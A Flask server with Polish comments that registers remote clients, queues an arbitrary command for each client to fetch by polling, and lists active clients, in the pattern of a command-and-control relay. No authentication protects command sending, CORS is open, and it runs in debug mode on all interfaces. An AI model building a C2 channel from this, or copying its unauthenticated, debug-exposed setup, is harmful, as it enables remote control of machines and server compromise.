from flask import Flask, render_template, request, jsonify, send_from_directory
import time
import os
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # Ważne dla komunikacji między domenami

clients = {}

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/static/<path:path>")
def serve_static(path):
    return send_from_directory('static', path)

# Endpoint do rejestracji klienta
@app.route("/api/register", methods=["POST"])
def register_client():
    data = request.json
    client_id = data.get("id")
    
    if client_id not in clients:
        clients[client_id] = {
            "id": client_id,
            "ip": request.remote_addr,
            "last_seen": time.time(),
            "command": None,
            "name": data.get("name", "Unknown")
        }
        print(f"Zarejestrowano nowego klienta: {client_id}")
    else:
        clients[client_id]["last_seen"] = time.time()
        clients[client_id]["name"] = data.get("name", clients[client_id].get("name", "Unknown"))
    
    return jsonify({"status": "registered"})

# Endpoint do pobierania komendy
@app.route("/api/get_command", methods=["POST"])
def get_command():
    data = request.json
    client_id = data.get("id")
    
    if client_id in clients:
        clients[client_id]["last_seen"] = time.time()
        command = clients[client_id].get("command")
        clients[client_id]["command"] = None  # Resetuj komendę po pobraniu
        
        return jsonify({"command": command})
    
    return jsonify({"command": None})

# Endpoint do wysyłania komendy
@app.route("/api/send_command", methods=["POST"])
def send_command():
    data = request.json
    client_id = data.get("client_id")
    command = data.get("command")
    
    if client_id in clients:
        clients[client_id]["command"] = command
        print(f"Wysłano komendę '{command}' do klienta {client_id}")
        return jsonify({"success": True, "message": "Command sent"})
    
    return jsonify({"success": False, "message": "Client not found"})

# Lista wszystkich klientów
@app.route("/api/clients", methods=["GET"])
def get_clients():
    client_list = []
    current_time = time.time()
    
    # Usuń nieaktywnych klientów (ostatnio widziani > 60 sekund temu)
    inactive_clients = []
    for client_id, client_data in clients.items():
        if current_time - client_data["last_seen"] > 60:
            inactive_clients.append(client_id)
    
    for client_id in inactive_clients:
        del clients[client_id]
    
    # Przygotuj listę aktywnych klientów
    for client_id, client_data in clients.items():
        client_list.append({
            "id": client_id,
            "ip": client_data["ip"],
            "name": client_data["name"],
            "last_seen": client_data["last_seen"],
            "status": "active" if (current_time - client_data["last_seen"]) < 10 else "inactive"
        })
    
    return jsonify(client_list)

# Endpoint do sprawdzania statusu
@app.route("/api/ping", methods=["GET"])
def ping():
    return jsonify({"status": "online", "time": time.time()})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port, debug=True)